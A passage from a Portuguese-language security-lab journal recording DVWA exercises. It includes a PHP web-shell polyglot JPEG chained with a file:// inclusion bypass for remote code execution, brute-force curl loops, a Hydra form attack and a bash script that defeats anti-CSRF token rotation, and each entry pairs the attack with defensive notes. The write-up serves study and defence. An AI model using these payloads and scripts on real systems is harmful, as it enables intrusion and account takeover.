Mesmo sem se combinar com upload de ficheiros, a inclusão local de ficheiros (LFI) já é, por si só, um vetor sério de exposição de informação — ficheiros de configuração com credenciais embutidas, código-fonte, ficheiros de log com tokens de sessão. Numa pequena/média empresa, é comum ficheiros de configuração conterem credenciais de base de dados ou de APIs diretamente escritas (um atalho habitual quando não há um cofre de segredos dedicado), transformando uma simples "leitura de ficheiro" numa fuga completa de credenciais. Numa empresa grande, práticas de gestão de configuração mais maduras (cofres de segredos, variáveis de ambiente) tendem a evitar que credenciais fiquem legíveis mesmo que o LFI tenha sucesso — mas a base de código é maior, com mais ficheiros passíveis de exposição acidental.

### Domínios relacionados

- **Security+ — D2 / D4:** whitelist por igualdade exata como padrão-ouro de validação de entrada
- **CEH — D5 (Web Application Hacking):** encerramento de vetores LFI/RFI; validação positiva vs. filtros de padrão

### Próximos passos

- [ ] Atualizar `guia-estudo-file-inclusion.md` com o nível Impossible
- [ ] Voltar ao encadeamento File Upload High/Impossible + File Inclusion, para tentar o compromisso completo pendente
- [ ] Módulo **Brute Force** — último módulo da Fase 2

---

## Entrada #45 — Encadeamento File Upload + File Inclusion (nível High) — RCE completo

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fechar a pendência em aberto desde a Entrada #39: comprometer por completo o File Upload no nível High, encadeando com o File Inclusion (o bypass do MIME type sozinho já não chegava — Entradas #38–#39).

### Ação executada

1. **Criação do ficheiro "polyglot"** no Kali: uma imagem `.jpg` genuína e válida (`convert -size 10x10 xc:blue tiny.jpg`, via ImageMagick), com o payload PHP colado a seguir aos dados da imagem:
   ```
   echo '<?php system($_GET["cmd"]); ?>' > payload.php
   cat tiny.jpg payload.php > polyglot.jpg
   ```
   Confirmado com `file polyglot.jpg` que continua a ser reconhecido como JPEG válido (o comando `file` só lê o cabeçalho, ignora o que vem a seguir).
2. **Upload do polyglot** via `curl`, com `security=high`, **sem qualquer disfarce de MIME type** (a imagem já é genuína):
   ```
   curl -s -b "PHPSESSID=...; security=high" -F "MAX_FILE_SIZE=100000" -F "uploaded=@polyglot.jpg;type=image/jpeg" -F "Upload=Upload" "http://192.168.10.101/vulnerabilities/upload/#"
   ```
   → aceite: `../../hackable/uploads/polyglot.jpg succesfully uploaded!`
3. **Inclusão do ficheiro carregado**, via o bypass `file://` do File Inclusion High (Entrada #43), apontando para o caminho absoluto no container (`/var/www/html`, raiz padrão do Apache/Debian):
   ```
   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/polyglot.jpg&cmd=whoami" --output resultado.bin
   strings resultado.bin | grep -i "www-data"
   ```
   (a resposta contém bytes binários da imagem — `curl` recusa-se a mostrar diretamente no terminal; guardado em ficheiro e pesquisado com `strings`.)

### Resultado

**RCE confirmado.** `www-data` aparece na saída, logo a seguir ao marcador `JFIF` do cabeçalho JPEG — o código PHP escondido dentro do ficheiro de imagem foi executado pelo `include()`, apesar de a extensão ser `.jpg` e o ficheiro ser uma imagem genuína e válida. **Compromisso completo do File Upload High**, através do File Inclusion.

### Deduções e raciocínio (certos e corrigidos)

- **A validação do File Upload High e a execução do File Inclusion avaliam coisas completamente diferentes:** o Upload confirma "isto é uma imagem válida?" (sim — `getimagesize()` ou equivalente só olha ao início do ficheiro); o `include()` do File Inclusion não verifica "isto é uma imagem?" nenhuma — lê o ficheiro todo e executa qualquer `<?php ?>` que encontrar, seja qual for a extensão. As duas defesas, cada uma sozinha correta para o que verifica, deixam um buraco quando combinadas.
- **Confirma a previsão registada no guia do File Upload** (Entrada #39): "um compromisso completo do High parece exigir encadear outra vulnerabilidade, não mais esforço no mesmo ataque" — exatamente o que aconteceu.

**Consigo explicar isto a alguém?**
  Porque é que uma imagem genuína, com código escondido a seguir aos dados da imagem, consegue executar código quando incluída, apesar de nunca poder ser corrida diretamente como `.php`: **Sim**.

### Como nos podemos defender

- **Nunca basta validar cada vulnerabilidade isoladamente** — a defesa em profundidade exige pensar em combinações entre módulos/funcionalidades, não só em cada filtro individual.
- Específico deste caso: mesmo com upload validado como imagem genuína, **nunca guardar uploads num diretório que o `include()`/`require()` da aplicação consiga alcançar** — separar fisicamente a área de uploads de qualquer caminho usado por funcionalidades de inclusão de ficheiros.
- Reforça, mais uma vez, a defesa central do File Inclusion: whitelist exata de valores para `page` (como no Impossible), que teria bloqueado este ataque por completo, independentemente do que estivesse guardado nos uploads.

### Domínios relacionados

- **Security+ — D2 / D4:** defesa em profundidade; combinação de vulnerabilidades individualmente mitigadas
- **CEH — D5 (Web Application Hacking):** técnica de "polyglot file" / encadeamento Upload + LFI para RCE, técnica real e documentada (OWASP)

### Próximos passos

- [ ] Testar o mesmo encadeamento no nível **Impossible** (upload com token anti-CSRF + tentativa de inclusão contra a whitelist exata) — hipótese: a whitelist do File Inclusion Impossible bloqueia por completo, independentemente do File Upload
- [ ] Módulo **Brute Force** — último módulo da Fase 2

---

## Entrada #46 — Encadeamento File Upload + File Inclusion (nível Impossible) — bloqueado, pendência fechada

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Confirmar se o encadeamento que comprometeu o File Upload High (Entrada #45) também funciona contra o Impossible, fechando de vez a pendência aberta desde a Entrada #39.

### Ação executada

Reutilizado o `polyglot.jpg` já carregado (Entrada #45 — o nível de segurança do Upload não apaga ficheiros já guardados), tentando incluí-lo com `security=impossible`:
```
curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/polyglot.jpg&cmd=whoami"
```

### Resultado

**Bloqueado**, como previsto: `ERROR: File not found!` — a mesma resposta da whitelist exata do File Inclusion Impossible (Entrada #44), que só aceita `include.php`, `file1.php`, `file2.php` ou `file3.php`. O nome do ficheiro carregado nunca poderia constar dessa lista fixa, por isso o encadeamento **não é possível** neste nível, independentemente do que o File Upload aceitar.

### Deduções e raciocínio (certos e corrigidos)

- **Confirmação de uma previsão feita antes do teste** (não só depois): ao prever corretamente que a whitelist bloquearia isto, ficou confirmado o modelo mental construído nas Entradas #44/#45 — a defesa mais forte contra este tipo de encadeamento não está no módulo que é atacado por último (Upload), está no elo intermédio que o ataque precisa de atravessar (Inclusion). Bloquear um único elo da cadeia é suficiente para proteger o conjunto todo, mesmo que outras partes continuem tecnicamente "fracas".
- **Lição de arquitetura de defesa:** o File Upload Impossible provavelmente continua vulnerável a upload de imagens genuínas com payload escondido (não testado ao detalhe aqui) — mas isso deixa de importar, porque não há forma de o ativar sem um File Inclusion também comprometido. Uma vulnerabilidade "adormecida" sem vetor de ativação não é explorável na prática.

**Consigo explicar isto a alguém?**
  Porque é que basta uma defesa forte num só elo da cadeia (File Inclusion) para proteger o conjunto, mesmo que o outro elo (File Upload) continue a aceitar o ficheiro malicioso: **Sim**.

### Como nos podemos defender

- Confirma a conclusão já registada na Entrada #45: a whitelist exata do File Inclusion é, por si só, suficiente para travar este tipo de encadeamento — reforça a prioridade dessa defesa em concreto.
- Princípio geral de defesa em profundidade: nem sempre é preciso (ou possível) fechar todas as vulnerabilidades individuais — travar um elo crítico da cadeia de ataque pode neutralizar o conjunto.

### Balanço do encadeamento File Upload + File Inclusion

**Pendência fechada.** High: comprometido por completo via ficheiro polyglot + bypass `file://` (Entrada #45). Impossible: o encadeamento falha, bloqueado pela whitelist exata do File Inclusion (esta entrada). Consolidação a acrescentar aos guias de [`File Upload`](./guias-estudo/guia-estudo-file-upload.md) e [`File Inclusion`](./guias-estudo/guia-estudo-file-inclusion.md).

### Gravidade e impacto real (num cenário empresarial) — a descoberta mais grave da Fase 2 (Entradas #45-46)

Este encadeamento — um ficheiro de imagem genuinamente válido a conseguir execução de código ao combinar duas defesas individualmente sólidas — é o caso paradigmático de por que razão uma avaliação de segurança tem de considerar vulnerabilidades em conjunto, não isoladamente. Um atacante não respeita as fronteiras entre "a funcionalidade de upload" e "a funcionalidade de inclusão de ficheiros" tal como a equipa de desenvolvimento as desenhou como módulos separados. Numa pequena/média empresa, raramente existe capacidade para este tipo de revisão de segurança entre funcionalidades — cada uma é construída e testada isoladamente por quem estiver disponível, e encadeamentos como este passam despercebidos durante anos. Numa empresa grande, equipas dedicadas de segurança aplicacional/pentest procuram ativamente por este tipo de falha encadeada — mas a superfície de muitas funcionalidades e microserviços a interagir entre si torna este um risco persistente e difícil de eliminar por completo, mesmo em programas de segurança maduros.

### Domínios relacionados

- **Security+ — D2 / D4:** defesa em profundidade; um elo forte pode neutralizar uma cadeia de ataque
- **CEH — D5 (Web Application Hacking):** limites práticos do encadeamento de vulnerabilidades (kill chain interrompida num elo intermédio)

### Próximos passos

- [ ] Atualizar os guias de File Upload e File Inclusion com a conclusão do encadeamento
- [ ] Módulo **Brute Force** — último módulo pendente da Fase 2

---

## Entrada #47 — Brute Force (nível Low) — ataque automatizado bem-sucedido

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Abrir o módulo Brute Force, testando o nível Low com um ataque de dicionário automatizado simples, feito à mão com um ciclo `for` em bash (antes de usar uma ferramenta dedicada como o Hydra).

### Ação executada

1. DVWA Security → Low. Módulo **Brute Force** aberto.
2. **Teste de controlo:** login com password propositadamente errada, para identificar a mensagem de falha. O browser complicou este passo por preencher a password automaticamente (sempre com o valor correto guardado); confirmado em vez disso via `curl`:
   ```
   curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=123456&Login=Login"
   ```
   → mensagem de falha identificada: `Username and/or password incorrect.` (a de sucesso, já vista no browser antes, é `Welcome to the password protected area <username>`).
3. **Wordlist pequena**, criada manualmente:
   ```
   cat > wordlist.txt << 'EOF'
   123456
   admin
   letmein
   qwerty
   password
   EOF
   ```
4. **Ciclo de ataque**, em bash, testando cada password da lista contra o utilizador `admin`:
   ```
   for pass in $(cat wordlist.txt); do
     curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=${pass}&Login=Login" | grep -o "Username and/or password incorrect\|Welcome to the password protected area"
   done
   ```

### Resultado

As primeiras quatro tentativas (`123456`, `admin`, `letmein`, `qwerty`) devolveram a mensagem de falha. A quinta (`password`) devolveu a mensagem de boas-vindas — **password correta encontrada por força bruta**, em segundos, sem qualquer intervenção manual repetida.

### Deduções e raciocínio (certos e corrigidos)

- **A vulnerabilidade aqui não é uma falha de código complexa** (como nos módulos anteriores) — é a **ausência total de travões** ao processo: o servidor aceitou e processou todas as tentativas instantaneamente, sem bloqueio de conta, sem CAPTCHA, sem atraso crescente entre pedidos. Um processo trivial (testar passwords uma a uma) só se torna perigoso quando não há nada a limitá-lo.
- **Diferença de género face aos módulos anteriores:** SQLi, Command Injection, XSS, CSRF, File Upload e File Inclusion exploravam todos uma falta de *validação* de um input específico. O Brute Force explora a falta de *limitação de taxa* (rate limiting) — uma categoria de defesa nova, que ainda não tinha aparecido no laboratório.

**Consigo explicar isto a alguém?**
  Porque é que o Brute Force é uma categoria de vulnerabilidade diferente das anteriores (ausência de travões, não falha de validação): **Sim**.
  O mecanismo do ciclo `for` em bash a automatizar o ataque: **Sim**.

### Como nos podemos defender

- **Bloqueio de conta** após um número de tentativas falhadas (temporário ou permanente até ação do utilizador).
- **Atraso crescente** entre tentativas falhadas (rate limiting), tornando um ataque de força bruta impraticavelmente lento.
- **CAPTCHA** após algumas tentativas falhadas, para distinguir humano de automação.
- **Autenticação multifator (MFA)** — mesmo que a password seja adivinhada, não chega sozinha.
- **Políticas de password fortes**, para que o espaço de tentativas necessário seja demasiado grande para ser prático.

### Domínios relacionados

- **Security+ — D2 / D3:** ataques de autenticação; controlos de bloqueio de conta e MFA
- **CEH — D3 (System Hacking):** ataques de password (dicionário, força bruta)

### Próximos passos

- [ ] Repetir o ataque com o **Hydra** (ferramenta padrão da indústria para brute force), em vez do ciclo manual em bash
- [ ] Brute Force nível Medium
- [ ] Brute Force nível High e Impossible

---

## Entrada #48 — Brute Force (nível Low) com Hydra — ferramenta profissional

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Repetir o ataque de força bruta da Entrada #47, agora com o **Hydra** (ferramenta padrão da indústria), em vez do ciclo manual em bash — para aprender a sintaxe da ferramenta e perceber o que ela acrescenta face ao método artesanal.

### Ação executada

1. Confirmado que o Hydra está instalado (`hydra -h` → v9.7, vem por defeito no Kali).
2. Construção do comando para o módulo `http-get-form`. **Várias tentativas falhadas por erros de sintaxe** (ver secção seguinte) antes de acertar.
3. Consulta da ajuda do próprio módulo (`hydra -U http-get-form`), que revelou a regra correta de ordenação dos campos.
4. Comando final que funcionou:
   ```
   hydra -l admin -P wordlist.txt 192.168.10.101 http-get-form "/vulnerabilities/brute/:username=admin&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=...:incorrect"
   ```

### Resultado

`[80][http-get-form] host: 192.168.10.101   login: admin   password: password` — `1 valid password found`. Mesma password encontrada que no ataque manual (Entrada #47), agora através da ferramenta dedicada.

### Deduções e raciocínio (certos e corrigidos)

- **A sintaxe do `http-get-form` do Hydra tem uma regra que não era óbvia e custou várias tentativas:** os campos são separados por `:`, e a **condição de falha tem de ser SEMPRE o último campo**. Os parâmetros opcionais (como o cabeçalho `H=` com a cookie) vão **entre** os parâmetros do formulário e a condição de falha — não depois dela. O erro inicial foi pôr a cookie a seguir à condição, o que fazia o Hydra tentar interpretar o `H=Cookie...` como se fosse a própria condição (`no valid optional parameter type given: F`).
- **Estrutura correta:** `url : parâmetros_do_form : H=cabeçalho : condição_de_falha`.
- **Escaping:** qualquer `:` dentro de um valor (ex.: no cabeçalho `Cookie: ...`) tem de ser escapado com `\:`, senão o Hydra lê-o como mais um separador de campo.
- **Marcadores:** `^PASS^` (e `^USER^`) é onde o Hydra injeta cada tentativa da wordlist; `-l` fixa um utilizador, `-P` aponta o ficheiro de passwords.
- **O que o Hydra acrescenta face ao ciclo bash (Entrada #47):** paralelismo (várias tentativas em simultâneo, `-t`), suporte a muitos protocolos além de HTTP (SSH, FTP, RDP, etc.), gestão automática de cookies/redirects, e output limpo. Para uma wordlist pequena o ganho não se nota; para milhões de entradas, é a diferença entre prático e impraticável.

**Consigo explicar isto a alguém?**
  A regra de ordenação dos campos no `http-get-form` (condição de falha sempre no fim) e porque é que o erro acontecia: **Sim**.
  O que o Hydra faz que o ciclo bash não faz (paralelismo, multi-protocolo): **Sim**.

### Como nos podemos defender

- As mesmas defesas da Entrada #47 (bloqueio de conta, rate limiting, CAPTCHA, MFA, políticas de password fortes) — nenhuma delas foi acionada, por isso o Hydra correu sem obstáculos.
- Nota defensiva importante: ferramentas como o Hydra são triviais de usar por um atacante. A defesa **nunca** pode depender de "o atacante não vai conseguir automatizar" — tem de assumir automação total e tornar o *volume* de tentativas impraticável ou detetável.

### Domínios relacionados

- **Security+ — D2 / D3:** ataques de autenticação automatizados; necessidade de controlos de rate limiting e MFA
- **CEH — D3 (System Hacking):** uso de ferramentas de brute force (Hydra) contra formulários web

### Próximos passos

- [ ] Brute Force nível Medium (verificar se acrescenta atraso/rate limiting)
- [ ] Brute Force nível High e Impossible (High costuma introduzir token anti-CSRF, que complica o Hydra)

---

## Entrada #49 — Brute Force (nível Medium) — defesa por atraso (rate limiting rudimentar)

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o Brute Force no nível Medium e identificar, medindo, que defesa acrescenta face ao Low.

### Ação executada

1. DVWA Security → Medium.
2. **Medição do tempo de resposta a um login falhado**, com `time`, no Medium e no Low para comparar:
   ```
   time curl -s -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=erro123&Login=Login" | grep -o "incorrect"
   time curl -s -b "PHPSESSID=...; security=low"    "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=erro123&Login=Login" | grep -o "incorrect"
   ```
3. **Ataque com Hydra** contra o Medium (mesmo comando da Entrada #48, só a trocar `security=low` por `security=medium`).

### Resultado

- **Tempo de resposta a uma falha:** Medium = `2,013s`; Low = `0,040s` — cerca de **50× mais lento** no Medium. Confirma um atraso artificial de ~2 segundos (`sleep(2)`) imposto a cada tentativa falhada.
- **Hydra:** encontrou a mesma password (`admin` / `password`), mas o ataque demorou **~8 segundos** (16:26:11 → 16:26:19) contra o instantâneo do Low. Diferença já visível com só 5 passwords.

### Deduções e raciocínio (certos e corrigidos)

- **Categoria de defesa nova, e diferente do padrão dos módulos anteriores:** o Medium não filtra nem bloqueia input — não há "blacklist" para contornar como no SQLi/XSS/Command Injection. Acrescenta apenas um **custo de tempo** a cada falha (rate limiting rudimentar). O ataque continua a funcionar exatamente da mesma forma; só fica mais lento.
- **Porque é que isto é uma defesa real, apesar de não "impedir" nada:** a segurança de uma password depende do tempo necessário para a adivinhar por força bruta. Multiplicar o custo de cada tentativa por ~50 transforma um ataque de minutos num de semanas/meses — a password pode ser trocada, o ataque detetado, ou simplesmente deixar de compensar. Defesa por *encarecimento*, não por *bloqueio*.
- **Limitação desta defesa:** um atraso fixo por pedido é contornável com **paralelismo** (muitos pedidos em simultâneo) e, num cenário real, distribuindo o ataque por muitos IPs. Abranda um atacante ingénuo/sequencial, não um determinado e com recursos.

**Consigo explicar isto a alguém?**
  Porque é que um simples atraso de 2s por tentativa é uma defesa real, mesmo sem bloquear o ataque: **Sim**.
  Porque é que essa defesa é mais fraca do que um bloqueio de conta ou um CAPTCHA: **Sim**.

### Como nos podemos defender

- O atraso (rate limiting) é um bom **complemento**, mas insuficiente sozinho — deve combinar-se com bloqueio de conta após N falhas, CAPTCHA, e MFA (defesas já listadas na Entrada #47).
- Idealmente, o atraso deve ser **por conta/IP e crescente** (backoff exponencial), não um valor fixo por pedido — para resistir também a ataques paralelos.

### Domínios relacionados

- **Security+ — D2 / D3:** rate limiting e backoff como controlos de mitigação de brute force
- **CEH — D3 (System Hacking):** impacto do rate limiting no tempo prático de um ataque de password

### Próximos passos

- [ ] Brute Force nível High (introduz token anti-CSRF — complica o Hydro, exige extrair o token a cada pedido)
- [ ] Brute Force nível Impossible

---

## Entrada #50 — Brute Force (nível High) — bypass do token anti-CSRF com script de dois passos

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o Brute Force no nível High, cuja defesa é um token anti-CSRF, e contorná-la de forma didática (script manual em bash em vez de lutar com a sintaxe CSRF do Hydra).

### Ação executada

1. DVWA Security → High.
2. **Confirmação do token e da sua rotação:** extraído o campo escondido `user_token` do formulário, e provado que **muda a cada carregamento da página** (dois pedidos seguidos devolveram tokens diferentes: `65978112...` e `2026f6dd...`):
   ```
   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/brute/" | grep -o "user_token[^>]*"
   ```
3. **Script de ataque em bash** (`brute_high.sh`), com a lógica de dois passos por tentativa:
   - buscar o token inicial da página;
   - para cada password: submeter o login com o token **atual**, verificar sucesso/falha, e **extrair o novo token da resposta** para usar na tentativa seguinte.
   ```bash
   token=$(curl -s -b "$COOKIE" "$URL/" | grep -oP "user_token' value='\K[a-f0-9]+")
   while read -r pass; do
     response=$(curl -s -b "$COOKIE" "$URL/?username=admin&password=${pass}&user_token=${token}&Login=Login")
     echo "$response" | grep -q "Welcome to the password protected area" && { echo "ENCONTRADA: $pass"; break; }
     token=$(echo "$response" | grep -oP "user_token' value='\K[a-f0-9]+")
   done < wordlist.txt
   ```

### Resultado

O script encontrou a password (`admin` / `password`), gerindo automaticamente a rotação do token. Confirma que o token anti-CSRF, sozinho, **não impede** o brute force — só o torna mais complexo de automatizar (obriga a um pedido extra por tentativa, para obter o token válido).

### Deduções e raciocínio (certos e corrigidos)

- **Para que serve realmente o token anti-CSRF aqui, e para que NÃO serve:** o token existe para impedir **CSRF** (pedidos forjados a partir de outro site — Entrada #36), garantindo que o pedido veio mesmo do formulário do próprio site. **Não** foi desenhado para travar brute force. Como efeito colateral, dificulta o brute force automatizado (obriga o atacante a carregar a página a cada tentativa), mas não o impede — quem controla o script vai buscar o token na mesma. É uma defesa contra outro tipo de ataque, que só acidentalmente atrapalha este.
- **Padrão reconhecido:** a técnica de "extrair um token do HTML com `grep -oP ... \K...` e reenviá-lo" é a mesma já usada no File Upload Impossible (Entrada #40). Ferramenta/hábito reutilizado num contexto novo.
- **Porque é que se optou pelo script manual e não pelo Hydra:** a sintaxe do Hydra para CSRF tokens é complexa e frágil (já tínhamos sofrido com a sintaxe base na Entrada #48); um script de dois passos em bash é mais transparente e ensina melhor o mecanismo — cada passo é visível e compreensível.

**Consigo explicar isto a alguém?**
  Porque é que um token que muda a cada pedido obriga a um "pedido extra" por tentativa, e como o script o resolve: **Sim**.
  Que o token anti-CSRF é uma defesa contra CSRF, não contra brute force, e só atrapalha este último por acidente: **Sim**.

### Como nos podemos defender

- O token anti-CSRF é necessário (contra CSRF), mas **não conta como defesa anti-brute-force** — não substitui bloqueio de conta, rate limiting, CAPTCHA ou MFA.
- Contra brute force especificamente, é preciso uma defesa que ataque o *volume* de tentativas (bloqueio/atraso por conta), não a *forma* do pedido.

### Domínios relacionados

- **Security+ — D2 / D3:** distinção entre controlos anti-CSRF e controlos anti-brute-force; não confundir defesas de categorias diferentes
- **CEH — D5 / D3:** automação de ataques a formulários com tokens dinâmicos (fetch-token → submit)

### Próximos passos

- [ ] Brute Force nível Impossible — fecha o módulo e a Fase 2

---

## Entrada #51 — Brute Force (nível Impossible) — bloqueio de conta trava o ataque. FECHA A FASE 2

**Data/hora:** 2026-08-17

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o Brute Force no nível Impossible, fechando o módulo — e com ele a Fase 2 do roteiro.

### Ação executada

Reutilizado o script de dois passos do High (que já gere o token anti-CSRF), com `security=impossible`. A wordlist tem a password correta (`password`) em **5º lugar**, depois de 4 tentativas falhadas — de propósito, para forçar o bloqueio de conta antes de lá chegar.
```bash
# brute_impossible.sh — igual ao brute_high.sh, com security=impossible
# e um ramo extra a detetar "locked" na resposta
```

### Resultado

**Todas as 5 tentativas falharam, incluindo `password` (a password correta).** Ao fim de 3 falhas, a conta ficou bloqueada, e as tentativas seguintes (`qwerty`, `password`) foram rejeitadas independentemente de estarem certas. O atacante tinha a password correta na wordlist e **não conseguiu entrar** — o ataque de força bruta foi efetivamente neutralizado.

### Deduções e raciocínio (certos e corrigidos)

- **A defesa mais eficaz contra brute force de todo o módulo, e porquê:** o Impossible ataca a *raiz* do brute force — a necessidade de fazer **muitas** tentativas. O bloqueio de conta após N falhas impede que o volume de tentativas sequer aconteça. Não interessa quão boa é a wordlist nem quão rápida é a ferramenta: ao fim de 3 falhas, a porta fecha.
- **Progressão das três defesas, em categorias distintas:**
  - **Medium** — *encarece* cada tentativa (atraso de 2s): abranda, não impede.
  - **High** — token anti-CSRF: obriga a um pedido extra por tentativa, mas é contornável e nem sequer foi desenhado contra brute force.
  - **Impossible** — *bloqueio de conta*: impede o volume de tentativas. É a única que ataca o mecanismo essencial do brute force.
- **O reforço técnico do Impossible (não testado ao detalhe, mas coerente com o código conhecido do DVWA):** além do bloqueio de conta, o Impossible usa **prepared statements** (PDO) na query de login — proteção contra SQL injection no próprio formulário de autenticação, defesa em profundidade que junta duas categorias (anti-brute-force + anti-SQLi) no mesmo ponto.
- **Efeito colateral relevante (denial of service):** o bloqueio de conta protege contra brute force, mas abre uma porta a um ataque diferente — um atacante pode bloquear deliberadamente a conta de uma vítima legítima, fazendo 3 tentativas erradas de propósito. Defesa não é grátis; troca um risco por outro (mais pequeno). Mitiga-se com bloqueio por IP em vez de por conta, ou desbloqueio automático após um tempo curto.

**Consigo explicar isto a alguém?**
  Porque é que o bloqueio de conta é qualitativamente mais forte que o atraso do Medium (ataca o volume, não o custo por tentativa): **Sim**.
  Que a password correta na wordlist não chega, se a conta bloquear antes de lá chegar: **Sim**.
  O efeito colateral de DoS do bloqueio de conta: **Sim**.

### Como nos podemos defender

- **Bloqueio de conta / rate limiting por conta e/ou IP** é a defesa central contra brute force — confirmado na prática.
- Combinar com **MFA** (mesmo password certa não chega) e **prepared statements** no formulário de login (não confiar que o campo de autenticação está imune a injeção).
- Ter em conta o risco de **DoS por bloqueio**: preferir desbloqueio temporizado ou bloqueio por IP, para não permitir que um atacante tranque contas de vítimas legítimas de propósito.

### Balanço do módulo Brute Force (Low → Impossible)

Low: ataque trivial, sem qualquer travão (manual em bash e com Hydra). Medium: atraso de 2s por falha — abranda mas não impede. High: token anti-CSRF — contornado com script de dois passos (fetch-token → submit). Impossible: bloqueio de conta após 3 falhas — **neutraliza o ataque**, mesmo com a password correta na lista. Categoria de vulnerabilidade nova face aos módulos anteriores: não é falta de validação de input, é falta de limitação do *volume* de tentativas. Módulo fechado.

### Gravidade e impacto real (num cenário empresarial) — síntese para o módulo Brute Force / DVWA login (Entradas #47-51)

Só o bloqueio de conta (Impossible) travou de facto um atacante determinado — o atraso de resposta (Medium) e a rotação de token anti-CSRF (High) foram ambos contornados com ajustes mínimos de ferramenta. O ataque de força bruta a credenciais continua a ser um dos vetores mais comuns em incidentes reais, precisamente porque muitas defesas comuns são "fricção", não barreiras reais — um atacante com automação e paciência simplesmente contorna atrasos. Numa pequena/média empresa, é comum não existir sequer política de bloqueio de conta (vista como incómoda para os poucos utilizadores internos), e uma conta de administrador comprometida num site com um único gestor É todo o perímetro de segurança do negócio. Numa empresa grande, o bloqueio de conta em massa cria um problema próprio, já identificado na própria Entrada #51: torna-se um vetor de negação de serviço contra utilizadores legítimos (um atacante pode bloquear deliberadamente milhares de contas de clientes), razão pela qual organizações maiores tendem a preferir autenticação multifator e limitação de tentativas adaptativa/baseada em risco, em vez de um simples bloqueio fixo.

### Domínios relacionados

- **Security+ — D2 / D3:** account lockout, MFA e prepared statements como defesa em profundidade na autenticação; risco de DoS por bloqueio
- **CEH — D3 (System Hacking):** limites práticos do brute force perante account lockout

### Próximos passos

- [ ] Criar `guia-estudo-brute-force.md` (consolidação do módulo, como nos anteriores)
- [ ] Atualizar o guia comparativo com o Brute Force
- [ ] **FASE 2 CONCLUÍDA** — próximo: Fase 3 (rede segura / VPN WireGuard), noutra sessão

---

## Entrada #52 — Início da Fase 3 (WireGuard) — instalação e geração de chaves, com falha de permissões na chave privada
**Data/hora:** 2026-08-22
**Máquinas ligadas:** OPNsense (gateway `192.168.10.254`), Ubuntu Desktop (`192.168.10.20`, servidor WireGuard, reserva fixa DHCP)

### Objetivo / Propósito
Arrancar a Fase 3 do roteiro: montar uma VPN WireGuard própria no lab, com o Ubuntu Desktop como servidor. Primeiro passo: instalar o pacote `wireguard` e gerar o par de chaves criptográficas (privada/pública) do servidor, que é a base de toda a configuração seguinte.

### Ação executada
1. Instalação: `sudo apt update && sudo apt install wireguard` (instalou `wireguard` + `wireguard-tools`).
2. Criação da pasta de configuração: `sudo mkdir -p /etc/wireguard`.
3. Geração da chave privada: `wg genkey | sudo tee /etc/wireguard/privatekey`.
4. Verificação das permissões do ficheiro criado: `sudo ls -la /etc/wireguard/`.
5. Correção das permissões: `sudo chmod 600 /etc/wireguard/privatekey`.
6. Derivação da chave pública a partir da privada: `sudo cat /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey`.

### Resultado
O pacote instalou sem problemas. A chave privada foi gerada corretamente (ficheiro de 45 bytes, tamanho esperado para uma chave WireGuard em base64). **Mas o ficheiro nasceu com permissões `-rw-r--r--` (644)** — legível por qualquer utilizador do sistema, não só pelo root. Corrigido para `-rw-------` (600) antes de se avançar. Chave pública derivada com sucesso a seguir (essa, por definição, não é sensível).

### Deduções e raciocínio
Uma chave privada é, por definição, o segredo que sustenta toda a confiança da ligação VPN — se outro utilizador do sistema (ou um atacante que ganhe acesso a uma conta local com privilégios menores) conseguir lê-la, consegue fazer-se passar pelo servidor, decifrar o tráfego capturado, ou personificar a máquina perante o cliente. Ter o ficheiro em `644` por omissão é uma falha de princípio, do mesmo género que já se tinha visto (por coincidência, na mesma sessão) com os ficheiros de índice de módulos do kernel do VMware: um ficheiro sensível a nascer com permissões demasiado abertas, por não se ter configurado explicitamente o contrário.

**Padrão que se repete:** confiar nas permissões por omissão do sistema para um ficheiro sensível é sempre um risco — a validação correta é sempre verificar explicitamente (`ls -la`) em vez de assumir.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "gerei um par de chaves para a VPN, mas antes de configurar mais nada, reparei que a chave privada tinha ficado legível por qualquer utilizador da máquina, não só pelo dono dela. Corrigi as permissões para só o root poder ler, porque uma chave privada legível por outros anula a segurança de toda a VPN."

### Como nos podemos defender
- Nunca assumir que as permissões por omissão de um ficheiro recém-criado são as corretas para o seu nível de sensibilidade — confirmar sempre com `ls -la`.
- Chaves privadas devem ter sempre o mínimo de acesso possível: idealmente `600` (só o dono lê/escreve) ou, em serviços que corram com utilizador próprio, restringido a esse utilizador apenas.
- Em ambientes de produção reais, ferramentas de *hardening* automatizado (ex.: CIS Benchmarks, auditd) costumam sinalizar precisamente este tipo de ficheiro com permissões demasiado abertas.

### Domínios relacionados
